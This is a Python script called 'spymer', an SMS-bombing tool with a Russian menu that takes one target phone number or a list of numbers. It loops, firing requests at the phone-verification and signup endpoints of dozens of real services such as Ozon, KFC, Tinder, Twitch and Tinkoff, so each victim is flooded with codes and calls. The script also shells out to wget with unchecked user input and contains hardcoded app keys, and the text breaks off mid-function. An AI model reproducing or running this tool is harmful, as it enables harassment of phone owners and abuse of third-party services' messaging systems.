#!/usr/bin/python3
# spymer v7.7
# Author: vaon4ik
import requests
import random
import datetime
import sys
import time
import argparse
import os
import json
from colorama import Fore, Back, Style

os.system('cls' if os.name=='nt' else 'clear')


def Main():
	global info
	global proxy
	ver = '77'
	version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
	if int(ver) < int(version):
		info = Back.BLUE+"\nВаша версия актуальна!"+Style.RESET_ALL
	else:
		info = " "
	proxy = "localhost"
	logo = Fore.GREEN+"Author:vaon4ik{sms_spymer_2.0} telegram_сhan4el:https://t.me/joinchat/PMg-a1UcFlsyE___0SuKiQ"
	def main():
		global info                                    
		global proxy		
		global ip
		global port
		while True:
			os.system('cls' if os.name=='nt' else 'clear')
			print(logo)
			print(info)
			print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
			print ("1) СМС спамер.")
			print("2) Добавить телефон в антиспам лист.")
			print("3) Проверить телефон в антиспам листе.")
			print("4) Обновить прокси.")
			print("5) Выход.")
			input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
			if input1 == "1":
				os.system('cls' if os.name=='nt' else 'clear')
				print(logo)
				print(info)
				print("Выберите один вариант:")
				print("1. Запустить спамер на один номер")
				print("2. Выгрузить номера из TXT файла ")
				print("3. Выгрузить номера по токену")
				input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if input11 == "3":
					try:
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print("Введите токен: ")
						print("Загрузить файл и получить токен можно по ссылке:")
						print(Fore.GREEN+"http://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
						token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						id=requests.post('https://fsystem88.ru/spymer/spym.php', data={'token': token}).json()["id"]
						if int(id) != 0:
							os.system("rm -rf ~/spymer/{}".format(token))
							os.system("wget -P ~/spymer/ https://fsystem88.ru/spymer/token/{}".format(token))
							os.system("cd ~/spymer")
							info=""
							os.system('cls' if os.name=='nt' else 'clear')
							print(logo)
							print(info)
							with open(token) as file:
								array = [row.strip() for row in file]
								print('Введите количество кругов ("Enter" - отмена):')
								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
								try:
									if int(count):
										count=int(count)
										iteration = 0
										while iteration < count:
											for phone in array:
												try:
													if int(phone):
														_phone=phone
														if _phone[0] == '+':
															_phone = _phone[1:]
														if _phone[0] == '8':
															_phone = '7'+_phone[1:]
														if _phone[0] == '9':
															_phone = '7'+_phone
														info = '\nТокен: {}\nТелефон: {}\n№ круга: {}'.format(token, phone, iteration+1)
														os.system('cls' if os.name=='nt' else 'clear')
														print(logo)
														print(info)
														id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
														if int(id) > 0:
															print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
															time.sleep(5)
														elif int(id)==0:
															_name = ''
															for x in range(12):
																_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
																password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
																username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
															_phone9 = _phone[1:]
															_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
															_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
															_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
															_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
															_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
															_phone = phone
															_email = _name+f'{iteration}'+'@gmail.com'
															email = _email
															print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
															if proxy=="localhost":
																proxies=None
															else:
																proxies="{'"+ssl+"':'"+ip+"'}"
															try:
																try:
																	requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
																except:
																	pass
																try:
																	requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
															except:
																pass
												except:
													os.system('cls' if os.name=='nt' else 'clear')
													print(logo)
													print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
													time.sleep(3)
											iteration=+1
								except:
									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

								info = Fore.BLUE+"\nГотово.\Токен: {}\nКол-во кругов: {}".format(token, iteration)+Style.RESET_ALL
					except:
						info="Отмена.\n"

				elif input11 == "2":
					try:	
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print("Введите путь к папке: ")
						print("(Папка должна находиться в домашней дирректории!)")
						dirc=input(Fore.BLUE+"spymer > ~/"+Style.RESET_ALL)
						print("Введите имя файла: ")
						txt=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						os.system("cd ~/{}".format(dirc))
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						with open(txt) as file:
							array = [row.strip() for row in file]
							print('Введите количество кругов ("Enter" - отмена):')
							count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
							try:
								if int(count):
									count=int(count)
									iteration = 0
									while iteration < count:
										for phone in array:
											try:
												if int(phone):
													_phone=phone
													if _phone[0] == '+':
														_phone = _phone[1:]
													if _phone[0] == '8':
														_phone = '7'+_phone[1:]
													if _phone[0] == '9':
														_phone = '7'+_phone
													info = '\nФайл: {}\nТелефон: {}\n№ круга: {}'.format(txt, phone, iteration+1)
													os.system('cls' if os.name=='nt' else 'clear')
													print(logo)
													print(info)
													id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
													if int(id) > 0:
														print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
														time.sleep(5)
													elif int(id)==0:
														_name = ''
														for x in range(12):
															_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
															password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
															username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
														_phone9 = _phone[1:]
														_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
														_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
														_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
														_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
														_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
														_phone = phone
														_email = _name+f'{iteration}'+'@gmail.com'
														email = _email
														print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
														if proxy=="localhost":
															proxies=None
														else:
															proxies="{'"+ssl+"':'"+ip+"'}"
														try:
															try:
																requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
															except:
																pass
															try:
																requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
															except:
																pass
														except:
															pass
											except:
												os.system('cls' if os.name=='nt' else 'clear')
												print(logo)
												print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
												time.sleep(3)
										iteration=+1
							except:
								info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

							info = Fore.BLUE+"\nГотово.\Файл: {}\nКол-во кругов: {}".format(txt, iteration)+Style.RESET_ALL
					except:
						info="Отмена.\n Если отмена не была запланирована проверьте правильность введенных данных/пути к файлу/имени файла."

				elif input11 == "1":
					try:
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print('Введите телефон ("Enter" - отмена):')
						phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(phone):
								print('Введите количество кругов ("Enter" - отмена):')
								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
								try:
									if int(count):
										count=int(count)
										_phone=phone
										if _phone[0] == '+':
											_phone = _phone[1:]
										if _phone[0] == '8':
											_phone = '7'+_phone[1:]
										if _phone[0] == '9':
											_phone = '7'+_phone
										iteration = 0
										id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
										if int(id) > 0:
											info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
										elif int(id)==0:
											_name = ''
											for x in range(12):
												_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
												password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
												username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
											_phone9 = _phone[1:]
											_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
											_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
											_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
											_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
